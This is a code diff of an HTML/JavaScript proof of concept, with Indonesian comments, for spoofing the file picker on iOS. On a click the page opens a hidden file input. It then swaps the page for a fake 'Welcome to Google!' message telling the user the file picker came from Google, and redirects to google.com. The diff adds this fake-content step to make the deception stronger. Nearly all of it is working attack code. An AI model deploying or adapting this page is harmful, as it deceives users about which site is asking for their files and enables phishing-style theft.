@@ -3,50 +3,58 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>File Picker Spoofing on iOS</title>
+    <title>Advanced Spoofing Test</title>
     <script>
-        // Fungsi untuk memicu file picker dan memanipulasi file input
+        // Fungsi untuk memicu file picker
         function openFilePicker() {
             const fileInput = document.createElement('input');
             fileInput.type = 'file';
-            fileInput.accept = 'image/*';  // Menerima hanya file gambar, misalnya
-            fileInput.style.display = 'none';  // Menyembunyikan elemen file input dari pengguna
+            fileInput.accept = 'image/*';  // Menerima hanya file gambar
+            fileInput.style.display = 'none';  // Menyembunyikan file input dari pengguna
 
-            // Menangani perubahan (file dipilih)
+            // Menangani perubahan file yang dipilih
             fileInput.addEventListener('change', (event) => {
                 const file = event.target.files[0];
                 if (file) {
                     console.log('File selected:', file.name);
-                    // Simulasi pengunduhan file yang dipilih (atau dapat diproses lebih lanjut)
+                    // Simulasi pengunduhan atau pemrosesan file
                 }
             });
 
-            // Menambahkan elemen file input ke dalam halaman dan memicu klik
+            // Menambahkan elemen file input dan memicu klik
             document.body.appendChild(fileInput);
-            fileInput.click();  // Memunculkan dialog pemilihan file
+            fileInput.click();  // Memunculkan dialog file picker
         }
 
-        // Fungsi untuk memicu navigasi yang cepat setelah file picker muncul
+        // Fungsi untuk mengubah konten halaman
+        function changePageContent() {
+            document.body.innerHTML = "<h1>Welcome to Google!</h1><p>If you just selected a file, it was from the Google website.</p>";
+        }
+
+        // Fungsi untuk menavigasi ke URL lain dan mengubah konten
         function spoofNavigation() {
             openFilePicker();  // Memicu file picker
             setTimeout(() => {
-                // Navigasi cepat setelah file picker dimunculkan
-                window.location.href = 'https://www.google.com';  // Alamat yang dipilih untuk navigasi
-            }, 500);  // Waktu tunggu sebelum melakukan navigasi (setengah detik)
+                // Mengubah konten halaman untuk menampilkan seolah-olah sudah di Google
+                changePageContent();
+
+                // Navigasi ke URL lain (misalnya, Google)
+                window.location.href = 'https://www.google.com';  // Mengarahkan ke situs lain
+            }, 500);  // Menunggu setengah detik sebelum memulai perubahan
         }
 
-        // Fungsi untuk menguatkan efek spoofing dengan lebih banyak interaksi pengguna
+        // Memulai interaksi dengan halaman
         function enhancedSpoofing() {
-            document.body.innerHTML = "<h1>Click anywhere to trigger the malicious flow.</h1>"; // Reset halaman agar lebih menarik
+            document.body.innerHTML = "<h1>Click anywhere to trigger the malicious flow.</h1>";  // Reset halaman agar lebih menarik
             document.addEventListener('click', () => {
-                spoofNavigation();  // Panggil spoofing navigasi dan file picker
+                spoofNavigation();  // Memulai spoofing navigasi dan file picker
             });
         }
 
-        window.onload = enhancedSpoofing;  // Memulai spoofing setelah halaman dimuat
+        window.onload = enhancedSpoofing;  // Mulai spoofing setelah halaman dimuat
     </script>
 </head>
 <body>
-    <h1>Loading...</h1>  <!-- Tampilan awal yang akan diganti setelah halaman dimuat -->
+    <h1>Loading...</h1>  <!-- Tampilan sementara yang akan diganti -->
 </body>
 </html>
